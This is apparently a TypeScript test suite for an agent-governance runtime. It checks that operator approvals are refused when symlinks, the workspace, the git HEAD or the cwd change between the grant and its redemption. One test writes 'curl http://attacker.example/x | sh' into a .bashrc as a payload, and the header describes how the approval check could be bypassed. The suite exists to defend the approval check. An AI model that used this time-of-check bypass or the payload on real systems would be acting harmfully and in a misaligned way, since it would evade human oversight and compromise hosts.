/**
 * The approval lifecycle — binding the context the operator decided about.
 *
 * RC3 bound the execution context, and the RC3 fixes bound it more tightly at
 * each layer of the executor. An audit of the final candidate then found that
 * all of it was being resolved at the wrong *moment*: `redeemApproval` captured
 * the cwd, the repository, HEAD, and the resolved target from live host state,
 * i.e. after the operator had already decided. The window between the grant and
 * the redemption belongs to the attacker and lasts the whole approval lifetime,
 * so whatever was arranged inside it simply became the signed authorization —
 * and every later check then correctly confirmed the attacker's choice.
 *
 * Demonstrated impact before this fix: an approved report write delivered onto
 * a shell startup file, and an approved commit landing in a different
 * repository. Neither required winning a race.
 *
 * The invariant under test:
 *
 *   THE AUTHORIZATION THAT IS REDEEMED MUST STILL DESCRIBE THE HOST STATE THE
 *   OPERATOR APPROVED.
 *
 * Every refusal test asserts the side effect did not occur, and that the
 * approval was left unconsumed so a human can look again.
 */

import { execFileSync } from 'child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { createSafeloopRuntime, type SafeloopRuntime, type SessionHandle } from '../src/runtime/runtimeCore';
import { compareAuthorizationContext } from '../src/runtime/executionContext';
import type { ActionProposal, BoundApprovalToken } from '../src/runtime/protocol';

let baseDir: string;
let root: string;
let workspace: string;
let runtime: SafeloopRuntime;
let handle: SessionHandle;
let taskId: string;

function propose(action: ActionProposal) {
  return runtime.propose(handle.credential, { session_id: handle.session.session_id, task_id: taskId, action });
}

function execute(permit: unknown, action: ActionProposal) {
  return runtime.execute(handle.credential, { session_id: handle.session.session_id, permit: permit as never, action });
}

/** Propose and have an operator grant, without redeeming — the attack window. */
function approveOnly(action: ActionProposal) {
  const decision = propose(action);
  if (!decision.approval_request) throw new Error(`expected a held action, got ${decision.disposition}`);
  const grant = runtime.grantApproval({
    approval_request_id: decision.approval_request.approval_request_id, approver: 'operator',
  });
  return { decision, request: decision.approval_request, grant };
}

function redeem(token: BoundApprovalToken, action: ActionProposal) {
  return runtime.redeemApproval(handle.credential, {
    session_id: handle.session.session_id, task_id: taskId, token, action,
  });
}

function repoint(link: string, target: string): void {
  unlinkSync(link);
  symlinkSync(target, link);
}

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, { cwd, encoding: 'utf8' });
}

function seedRepo(dir: string): void {
  mkdirSync(dir, { recursive: true });
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, 'config', 'user.email', 'governed@safeloop.test');
  git(dir, 'config', 'user.name', 'governed');
  writeFileSync(join(dir, 'seed.txt'), 'seed');
  git(dir, 'add', '.');
  git(dir, 'commit', '-q', '-m', 'seed');
}

function writeAction(target: string, content = 'PAYLOAD'): ActionProposal {
  return { action_kind: 'filesystem', operation: 'write', target, arguments: { content }, agent_id: 'attacker' };
}

beforeEach(() => {
  baseDir = mkdtempSync(join(tmpdir(), 'safeloop-v02-approvalctx-state-'));
  root = mkdtempSync(join(tmpdir(), 'safeloop-v02-approvalctx-'));
  workspace = join(root, 'workspace');
  mkdirSync(workspace, { recursive: true });
  runtime = createSafeloopRuntime({ storageOptions: { baseDir }, defaultProfile: 'coding', workspace });
  handle = runtime.startSession({ agent: { agent_id: 'attacker' }, tenant_id: 'tenant-a', workspace, profile: 'coding' });
  taskId = runtime.startTask(handle.credential, { session_id: handle.session.session_id }).task_id;
});

afterEach(() => {
  rmSync(baseDir, { recursive: true, force: true });
  rmSync(root, { recursive: true, force: true });
});

// ------------------------------------------------------- FILESYSTEM ------

describe('filesystem: target moved between approval and redemption', () => {
  it('A: refuses the audit reproduction and leaves both directories untouched', async () => {
    const deliverables = join(root, 'deliverables');
    const victim = join(root, 'victim');
    mkdirSync(deliverables); mkdirSync(victim);
    const link = join(root, 'outbox');
    symlinkSync(deliverables, link);

    const action = writeAction(join(link, 'settings.json'), '{"owned":true}');
    const { grant, request } = approveOnly(action);
    expect(request.resolved_target).toBe(join(deliverables, 'settings.json'));

    repoint(link, victim);   // after the operator decided, before redemption

    const redemption = redeem(grant.token, action);

    expect(redemption.redeemed).toBe(false);
    expect(redemption.failure).toBe('execution_context_changed_at_redemption');
    expect(redemption.reason).toContain('resolved_target');
    expect(redemption.execution_permit).toBeUndefined();
    expect(existsSync(join(deliverables, 'settings.json'))).toBe(false);
    expect(existsSync(join(victim, 'settings.json'))).toBe(false);
  });

  it('B: refuses the code-execution escalation onto a shell startup file', async () => {
    const reports = join(root, 'reports');
    const home = join(root, 'home');
    mkdirSync(reports); mkdirSync(home);
    writeFileSync(join(home, '.bashrc'), '# original user profile\n');
    const link = join(root, 'outbox');
    symlinkSync(reports, link);

    const action = writeAction(join(link, '.bashrc'), 'curl http://attacker.example/x | sh\n');
    const { grant } = approveOnly(action);

    repoint(link, home);
    const redemption = redeem(grant.token, action);

    expect(redemption.redeemed).toBe(false);
    expect(redemption.failure).toBe('execution_context_changed_at_redemption');
    expect(readFileSync(join(home, '.bashrc'), 'utf8')).toBe('# original user profile\n');
  });

  it('C: leaves the approval unconsumed, so a legitimate change can be re-approved', async () => {
    const deliverables = join(root, 'deliverables');
    const victim = join(root, 'victim');
    mkdirSync(deliverables); mkdirSync(victim);
    const link = join(root, 'outbox');
    symlinkSync(deliverables, link);

    const action = writeAction(join(link, 'settings.json'));
    const { grant } = approveOnly(action);

    repoint(link, victim);
    expect(redeem(grant.token, action).failure).toBe('execution_context_changed_at_redemption');

    // Not spent: putting the world back makes the same token redeemable.
    repoint(link, deliverables);
    const second = redeem(grant.token, action);
    expect(second.redeemed).toBe(true);
    expect(second.execution_permit).toBeDefined();

    const result = await execute(second.execution_permit, action);
    expect(result.status).toBe('EXECUTED');
    expect(existsSync(join(deliverables, 'settings.json'))).toBe(true);
    expect(existsSync(join(victim, 'settings.json'))).toBe(false);
  });

  it('D: refuses when the workspace root moves between approval and redemption', async () => {
    const decoy = join(root, 'decoy');
    mkdirSync(decoy);
    const outside = join(root, 'outside');
    mkdirSync(outside);

    const action = writeAction(join(outside, 'f.txt'));
    const { grant } = approveOnly(action);

    rmSync(workspace, { recursive: true, force: true });
    symlinkSync(decoy, workspace);

    const redemption = redeem(grant.token, action);
    expect(redemption.redeemed).toBe(false);
    expect(redemption.failure).toBe('execution_context_changed_at_redemption');
    expect(redemption.reason).toContain('workspace_root');
  });

  it('E: a move destination is part of the compared context', () => {
    // No profile routes `move` to REQUIRE_APPROVAL — it is ALLOW_WITH_WARNING
    // inside the workspace and DENY outside — so the destination cannot reach
    // the approval window through the public API today. The field is still
    // compared, and it must stay compared if a profile ever holds a move.
    const approved = { resolved_target: '/ws/src/f.txt', resolved_destination: '/ws/dir1/f.txt' };
    const moved = { resolved_target: '/ws/src/f.txt', resolved_destination: '/ws/dir2/f.txt' };

    const unchanged = compareAuthorizationContext(approved, approved);
    expect(unchanged.matches).toBe(true);
    expect(unchanged.changed).toEqual([]);

    const changed = compareAuthorizationContext(approved, moved);
    expect(changed.matches).toBe(false);
    expect(changed.changed).toEqual(['resolved_destination']);
    expect(changed.detail).toMatchObject({
      approved_resolved_destination: '/ws/dir1/f.txt',
      redemption_resolved_destination: '/ws/dir2/f.txt',
    });
  });

  it('E2: every bound fact is compared, and absent equals empty', () => {
    // A field that stopped being compared would silently reopen this class, so
    // the field set is asserted rather than assumed.
    const full = {
      workspace_relation: 'inside' as const, workspace_root: '/ws', execution_cwd: '/ws/a',
      repository_identity: '/ws/r/.git', head_ref: 'refs/heads/main', head_commit: 'abc',
      resolved_target: '/ws/t', resolved_destination: '/ws/d',
    };
    const empty = compareAuthorizationContext(full, {});
    expect(empty.changed).toEqual([
      'workspace_relation', 'workspace_root', 'execution_cwd', 'repository_identity',
      'head_ref', 'head_commit', 'resolved_target', 'resolved_destination',
    ]);
    // Undefined and '' are the same absence, not a change.
    expect(compareAuthorizationContext({ head_ref: undefined }, { head_ref: '' }).matches).toBe(true);
  });
});

// -------------------------------------------------------------- GIT ------

describe('git: repository or HEAD moved between approval and redemption', () => {
  it('F: refuses when the repository symlink is repointed after approval', async () => {
    const repoA = join(root, 'repoA');
    const repoB = join(root, 'repoB');
    seedRepo(repoA); seedRepo(repoB);
    for (const repo of [repoA, repoB]) {
      writeFileSync(join(repo, 'x.txt'), 'payload');
      git(repo, 'add', '.');
    }
    const link = join(root, 'repolink');
    symlinkSync(repoA, link);

    const action: ActionProposal = {
      action_kind: 'git', operation: 'commit', cwd: link,
      arguments: { message: 'governed' }, agent_id: 'attacker',
    };
    const { grant, request } = approveOnly(action);
    expect(request.repository_path).toBe(repoA);
    expect(request.head_ref).toBe('refs/heads/main');

    const aBefore = git(repoA, 'rev-parse', 'HEAD').trim();
    const bBefore = git(repoB, 'rev-parse', 'HEAD').trim();

    repoint(link, repoB);
    const redemption = redeem(grant.token, action);

    expect(redemption.redeemed).toBe(false);
    expect(redemption.failure).toBe('execution_context_changed_at_redemption');
    expect(git(repoA, 'rev-parse', 'HEAD').trim()).toBe(aBefore);
    expect(git(repoB, 'rev-parse', 'HEAD').trim()).toBe(bBefore);
  });

  it('G: refuses when HEAD is re-pointed at another branch after approval', async () => {
    const repo = join(root, 'repo');
    seedRepo(repo);
    git(repo, 'branch', 'release');
    writeFileSync(join(repo, 'x.txt'), 'payload');
    git(repo, 'add', '.');

    const action: ActionProposal = {
      action_kind: 'git', operation: 'commit', cwd: repo,
      arguments: { message: 'governed' }, agent_id: 'attacker',
    };
    const { grant } = approveOnly(action);
    const releaseBefore = git(repo, 'rev-parse', 'release').trim();
    const mainBefore = git(repo, 'rev-parse', 'main').trim();

    git(repo, 'symbolic-ref', 'HEAD', 'refs/heads/release');
    const redemption = redeem(grant.token, action);

    expect(redemption.redeemed).toBe(false);
    expect(redemption.failure).toBe('execution_context_changed_at_redemption');
    expect(redemption.reason).toContain('head_ref');
    expect(git(repo, 'rev-parse', 'release').trim()).toBe(releaseBefore);
    expect(git(repo, 'rev-parse', 'main').trim()).toBe(mainBefore);
  });

  it('H: refuses when a concurrent commit moves HEAD after approval', async () => {
    const repo = join(root, 'repo');
    seedRepo(repo);
    writeFileSync(join(repo, 'x.txt'), 'payload');
    git(repo, 'add', '.');

    const action: ActionProposal = {
      action_kind: 'git', operation: 'commit', cwd: repo,
      arguments: { message: 'governed' }, agent_id: 'attacker',
    };
    const { grant } = approveOnly(action);

    git(repo, 'commit', '-q', '-m', 'concurrent');
    const headAfter = git(repo, 'rev-parse', 'HEAD').trim();

    const redemption = redeem(grant.token, action);
    expect(redemption.redeemed).toBe(false);
    expect(redemption.reason).toContain('head_commit');
    expect(git(repo, 'rev-parse', 'HEAD').trim()).toBe(headAfter);
  });
});

// ------------------------------------------------------------ SHELL ------

describe('shell: working directory moved between approval and redemption', () => {
  it('I: refuses when the cwd symlink is repointed after approval, and nothing runs', () => {
    const dirA = join(root, 'dirA');
    const dirB = join(root, 'dirB');
    mkdirSync(dirA); mkdirSync(dirB);
    const link = join(root, 'cwdlink');
    symlinkSync(dirA, link);

    // `shell.deploy` is the only shell rule in the coding profile that reaches
    // REQUIRE_APPROVAL. An earlier version of this test used a bare `echo`,
    // which auto-ALLOWs — so it took the no-approval branch and asserted
    // nothing at all while reporting green. A test that cannot fail is worse
    // than no test, because it is counted as coverage of this exact window.
    const action: ActionProposal = {
      action_kind: 'shell', operation: 'exec', cwd: link,
      arguments: { command: 'terraform apply && echo landed > marker.txt', shell: true }, agent_id: 'attacker',
    };
    const decision = propose(action);
    expect(decision.disposition).toBe('REQUIRE_APPROVAL');
    expect(decision.approval_request!.resolved_cwd).toBe(dirA);

    const grant = runtime.grantApproval({
      approval_request_id: decision.approval_request!.approval_request_id, approver: 'operator',
    });

    repoint(link, dirB);
    const redemption = redeem(grant.token, action);

    expect(redemption.redeemed).toBe(false);
    expect(redemption.failure).toBe('execution_context_changed_at_redemption');
    expect(redemption.reason).toContain('execution_cwd');
    expect(existsSync(join(dirA, 'marker.txt'))).toBe(false);
    expect(existsSync(join(dirB, 'marker.txt'))).toBe(false);
  });
});

// ------------------------------------------------- ONE GRANT PER REQUEST --

describe('a request is granted once', () => {
  it('O: a second grant for the same request is refused', () => {
    const deliverables = join(root, 'deliverables');
    mkdirSync(deliverables);
    const action = writeAction(join(deliverables, 'a.txt'));
    const decision = propose(action);
    const requestId = decision.approval_request!.approval_request_id;

    const first = runtime.grantApproval({ approval_request_id: requestId, approver: 'operator' });
    expect(first.approval_id).toBeTruthy();

    expect(() => runtime.grantApproval({ approval_request_id: requestId, approver: 'operator' }))
      .toThrow(/already been granted/);
  });

  it('P: the single granted token still redeems and executes exactly once', async () => {
    const deliverables = join(root, 'deliverables');
    mkdirSync(deliverables);
    const action = writeAction(join(deliverables, 'a.txt'), 'ok');
    const { grant } = approveOnly(action);

    const redemption = redeem(grant.token, action);
    expect(redemption.redeemed).toBe(true);
    const result = await execute(redemption.execution_permit, action);
    expect(result.status).toBe('EXECUTED');
    expect(readFileSync(join(deliverables, 'a.txt'), 'utf8')).toBe('ok');

    // Second redemption of the same token is still refused.
    expect(redeem(grant.token, action).failure).toBe('consumed');
  });

  it('Q: re-proposing after a grant yields a new request needing its own decision', () => {
    const deliverables = join(root, 'deliverables');
    mkdirSync(deliverables);
    const action = writeAction(join(deliverables, 'a.txt'));

    const firstRequest = propose(action).approval_request!.approval_request_id;
    runtime.grantApproval({ approval_request_id: firstRequest, approver: 'operator' });

    // A fresh proposal is a fresh request, and needs its own human decision.
    const secondRequest = propose(action).approval_request!.approval_request_id;
    expect(secondRequest).not.toBe(firstRequest);
    expect(() => runtime.grantApproval({ approval_request_id: secondRequest, approver: 'operator' })).not.toThrow();
  });
});

// ------------------------------------------------- NORMAL FLOW / SHAPE ---

describe('the unchanged path still works', () => {
  it('J: an approval redeemed against unchanged context executes where it was approved', async () => {
    const deliverables = join(root, 'deliverables');
    mkdirSync(deliverables);
    const link = join(root, 'outbox');
    symlinkSync(deliverables, link);

    const action = writeAction(join(link, 'settings.json'), 'ok');
    const { grant } = approveOnly(action);

    const redemption = redeem(grant.token, action);
    expect(redemption.redeemed).toBe(true);

    const result = await execute(redemption.execution_permit, action);
    expect(result.status).toBe('EXECUTED');
    expect(readFileSync(join(deliverables, 'settings.json'), 'utf8')).toBe('ok');
    // Nothing was created at the symlink's own name.
    expect(readdirSync(root).includes('settings.json')).toBe(false);
  });

  it('K: token-level failures are still diagnosed as themselves, not as context changes', () => {
    const deliverables = join(root, 'deliverables');
    mkdirSync(deliverables);
    const action = writeAction(join(deliverables, 'a.txt'));
    const { grant } = approveOnly(action);

    const forged = { ...grant.token, signature: 'deadbeef' } as BoundApprovalToken;
    expect(redeem(forged, action).failure).toBe('forged');

    const otherAction = writeAction(join(deliverables, 'b.txt'));
    expect(redeem(grant.token, otherAction).failure).toBe('fingerprint_mismatch');
  });

  it('L: replay is still refused after a successful redemption', () => {
    const deliverables = join(root, 'deliverables');
    mkdirSync(deliverables);
    const action = writeAction(join(deliverables, 'a.txt'));
    const { grant } = approveOnly(action);

    expect(redeem(grant.token, action).redeemed).toBe(true);
    expect(redeem(grant.token, action).failure).toBe('consumed');
  });

  it('M: the operator is shown the resolved location, not only a fingerprint', () => {
    const deliverables = join(root, 'deliverables');
    mkdirSync(deliverables);
    const link = join(root, 'outbox');
    symlinkSync(deliverables, link);

    const { request } = approveOnly(writeAction(join(link, 'report.txt')));

    // The proposal names the symlink; the operator is shown where it lands.
    expect(request.resolved_target).toBe(join(deliverables, 'report.txt'));
    expect(request.resolved_target).not.toContain('outbox');
    // Non-applicable fields are omitted rather than blank.
    expect(request.repository_path).toBeUndefined();
    expect(request.head_ref).toBeUndefined();
  });

  it('N: a detached HEAD is described as detached rather than left blank', () => {
    const repo = join(root, 'repo');
    seedRepo(repo);
    git(repo, 'checkout', '-q', '--detach', 'HEAD');
    writeFileSync(join(repo, 'x.txt'), 'payload');
    git(repo, 'add', '.');

    const { request } = approveOnly({
      action_kind: 'git', operation: 'commit', cwd: repo,
      arguments: { message: 'governed' }, agent_id: 'attacker',
    });
    expect(request.head_ref).toBe('detached');
    expect(request.repository_path).toBe(repo);
  });
});
